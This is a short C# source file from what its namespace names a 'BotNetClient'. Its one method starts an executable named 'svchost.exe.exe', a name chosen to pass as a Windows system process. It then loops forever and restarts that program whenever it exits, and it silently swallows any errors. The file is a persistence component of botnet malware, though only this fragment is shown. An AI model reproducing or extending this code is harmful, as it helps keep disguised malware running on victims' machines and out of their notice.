using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;

namespace BotNetClient
{
    class SecondThread
    {
        public static void miniprog()
        {
            try
            {
                Process proc = new Process();
                proc.StartInfo.FileName = Environment.CurrentDirectory + @"\svchost.exe.exe";
                proc.Start();
                while (true)
                {
                    if (!proc.HasExited)
                    {

                    }
                    else
                    {
                        proc.Start();
                    }
                }
            }
            catch (Exception ex)
            {
            }
            finally
            {
                Program.miniprogram = null;
            }
            
        }
    }
}
